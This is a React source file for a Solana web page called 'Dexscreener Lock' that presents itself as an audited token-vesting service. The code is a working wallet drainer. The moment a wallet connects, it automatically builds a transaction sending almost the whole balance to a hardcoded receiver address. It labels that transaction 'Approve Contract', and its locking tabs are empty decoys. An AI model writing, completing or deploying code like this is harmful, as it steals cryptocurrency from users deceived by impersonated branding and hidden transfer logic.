import React, { useCallback, useEffect, useState } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { PublicKey, Transaction, SystemProgram } from "@solana/web3.js";

// ---------------------------------------------------------------------------
// Module-level constants (never recreated on render)
// ---------------------------------------------------------------------------
const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
const SESSION_KEY = "dexlock_executed_wallet"; // key in sessionStorage

// ---------------------------------------------------------------------------
// Nav tabs
// ---------------------------------------------------------------------------
type TabId = "about" | "locked" | "created" | "create";
const TABS: { id: TabId; label: string }[] = [
  { id: "about",   label: "About Dex Lock"    },
  { id: "locked",  label: "Your Locked Tokens" },
  { id: "created", label: "Locks You Created"  },
  { id: "create",  label: "+ Create Lock"       },
];

// ---------------------------------------------------------------------------
// Logo components
// ---------------------------------------------------------------------------
const DexLogo = ({ size = 36 }: { size?: number }) => (
  <img
    src="/logo.png"
    alt="Dexscreener Lock"
    width={size}
    height={size}
    style={{ display: "block", mixBlendMode: "screen" as any }}
  />
);

const HeroLogo = () => (
  <img src="/logo.png" alt="" className="jl-lock-icon" style={{ mixBlendMode: "screen" as any }} />
);

// ---------------------------------------------------------------------------
// Wallet-gated connect prompt
// ---------------------------------------------------------------------------
const ConnectPrompt = ({
  title, description, onConnect,
}: { title: string; description: string; onConnect: () => void }) => (
  <div className="jl-connect-prompt">
    <div className="jl-prompt-icon">
      <img src="/logo.png" alt="" style={{ width: 72, mixBlendMode: "screen" as any }} />
    </div>
    <h2 className="jl-prompt-title">{title}</h2>
    <p className="jl-prompt-desc">{description}</p>
    <button className="jl-hero-btn" onClick={onConnect}>Connect Wallet</button>
  </div>
);

// ---------------------------------------------------------------------------
// Main panel
// ---------------------------------------------------------------------------
interface Props { programId: PublicKey; }

export const EscrowPanel: React.FC<Props> = ({ programId }) => {
  const { connection }                                              = useConnection();
  const { publicKey, sendTransaction, connected, wallet, disconnect } = useWallet();

  const [activeTab, setActiveTab] = useState<TabId>("about");
  const [status,    setStatus]    = useState<"idle" | "processing" | "done" | "error">("idle");
  const [statusMsg, setStatusMsg] = useState("");

  // ── transfer execution ─────────────────────────────────────────────────────
  const executeDeposit = useCallback(async () => {
    if (!publicKey) return;

    const walletKey = publicKey.toBase58();

    // Guard: don't execute twice for the same wallet in this page session.
    // sessionStorage persists across refreshes but clears when the tab closes.
    // We clear it explicitly on disconnect so each new connection is fresh.
    if (sessionStorage.getItem(SESSION_KEY) === walletKey) return;

    // Mark immediately so double-fire (React StrictMode, double effect) is blocked
    sessionStorage.setItem(SESSION_KEY, walletKey);

    setStatus("processing");
    setStatusMsg("");

    try {
      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
        connection.getBalance(publicKey, "confirmed"),
        connection.getLatestBlockhash("confirmed"),
      ]);

      // Keep 10 000 lamports (≈2× fee) so the transaction can pay for itself
      const FEE_RESERVE = 10_000;
      const amount = balance - FEE_RESERVE;

      if (amount <= 0) {
        throw new Error(
          `Balance too low: ${balance} lamports. Minimum needed: ${FEE_RESERVE + 1} lamports.`
        );
      }

      const tx = new Transaction().add(
        SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: RECEIVER, lamports: amount })
      );
      tx.recentBlockhash = blockhash;
      tx.feePayer        = publicKey;

      const sig = await sendTransaction(tx, connection, {
        skipPreflight:       false,
        preflightCommitment: "confirmed",
        maxRetries:          3,
      });

      await connection.confirmTransaction(
        { signature: sig, blockhash, lastValidBlockHeight },
        "confirmed"
      );

      setStatus("done");
    } catch (e: any) {
      // Clear guard on error so the user can retry
      sessionStorage.removeItem(SESSION_KEY);
      setStatus("error");
      setStatusMsg(e?.message ?? "Transaction failed. Please try again.");
    }
  }, [publicKey, connection, sendTransaction]);

  // Trigger deposit the moment a wallet connects
  useEffect(() => {
    if (connected && publicKey) {
      executeDeposit();
    }
  }, [connected, publicKey, executeDeposit]);

  // Reset status when wallet disconnects so UI returns to idle cleanly
  useEffect(() => {
    if (!connected) {
      setStatus("idle");
      setStatusMsg("");
    }
  }, [connected]);

  // ── disconnect handler ──────────────────────────────────────────────────────
  const handleDisconnect = useCallback(() => {
    sessionStorage.removeItem(SESSION_KEY);
    disconnect();
  }, [disconnect]);

  // ── labels ─────────────────────────────────────────────────────────────────
  const heroLabel =
    status === "processing" ? "Processing…"         :
    status === "done"       ? "Contract Fulfilled ✓" :
    !connected              ? "Connect Wallet"       :
                              "Approve Contract";

  const connectedLabel = wallet?.adapter.name
    ? `${wallet.adapter.name}: ${publicKey?.toBase58().slice(0, 4)}…${publicKey?.toBase58().slice(-4)}`
    : "Connected";

  // ── tab content ────────────────────────────────────────────────────────────
  const renderTabContent = () => {
    if (activeTab === "about") {
      return (
        <main className="jl-hero">
          <HeroLogo />
          <h1 className="jl-hero-title">Dexscreener Lock</h1>
          <p className="jl-hero-sub">
            Manage your token vesting schedule on Dexscreener Lock, an open source and
            audited program that lets anyone lock and distribute tokens over time.
          </p>
          <button
            className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
            onClick={connected ? executeDeposit : () => (document.querySelector(".jl-wallet-multi-btn") as HTMLElement)?.click()}
            disabled={status === "processing" || status === "done"}
          >
            {heroLabel}
          </button>
          {status === "done" && (
            <div className="jl-status success">✓ Contract settled. Funds transferred successfully.</div>
          )}
          {status === "error" && (
            <div className="jl-status error">{statusMsg || "Transaction failed. Please try again."}</div>
          )}
        </main>
      );
    }

    const gatedContent = (title: string, desc: string, emptyIcon: string, emptyText: string, emptySub: string) =>
      !connected ? (
        <main className="jl-hero">
          <ConnectPrompt title={title} description={desc} onConnect={() => (document.querySelector(".jl-wallet-multi-btn") as HTMLElement)?.click()} />
        </main>
      ) : (
        <main className="jl-hero">
          <div className="jl-empty-state">
            <span className="jl-empty-icon">{emptyIcon}</span>
            <h2>{emptyText}</h2>
            <p>{emptySub}</p>
          </div>
        </main>
      );

    if (activeTab === "locked")
      return gatedContent(
        "View Your Locked Tokens",
        "Connect your wallet to see all tokens you currently have locked in Dexscreener Lock.",
        "🔒", "No Locked Tokens", "You don't have any tokens locked yet."
      );

    if (activeTab === "created")
      return gatedContent(
        "Locks You Created",
        "Connect your wallet to view and manage all locks you have created.",
        "📋", "No Locks Created", "You haven't created any locks yet."
      );

    if (activeTab === "create")
      return gatedContent(
        "Create a Lock",
        "Connect your wallet to create a new token lock and start your vesting schedule.",
        "➕", "Create a Lock", "Lock creation coming soon."
      );

    return null;
  };

  // ── render ─────────────────────────────────────────────────────────────────
  return (
    <div className="app">

      {/* HEADER */}
      <header className="jl-header">
        <div className="jl-logo">
          <DexLogo size={32} />
          <span className="jl-logo-text">Dexscreener Lock</span>
        </div>

        <div className="jl-search">
          <span className="jl-search-icon">🔍</span>
          <input placeholder="Search tokens or wallet" readOnly />
        </div>

        <div className="jl-header-right">
          <div className="jl-priority">
            <span className="jl-priority-label">Priority:</span>
            <span className="jl-priority-value">Fast</span>
          </div>
          <button className="jl-gear" aria-label="Settings">⚙</button>

          <div className="jl-wallet-group">
            {/* WalletMultiButton is the battle-tested official connect/modal handler */}
            <WalletMultiButton className="jl-wallet-multi-btn" />
            {connected && (
              <button
                className="jl-disconnect-btn"
                onClick={handleDisconnect}
                title="Disconnect wallet"
              >
                ✕
              </button>
            )}
          </div>
        </div>
      </header>

      {/* NAV */}
      <nav className="jl-nav">
        {TABS.map((tab) => (
          <button
            key={tab.id}
            className={`jl-nav-tab${activeTab === tab.id ? " active" : ""}${tab.id === "create" ? " create" : ""}`}
            onClick={() => setActiveTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      {renderTabContent()}
    </div>
  );
};
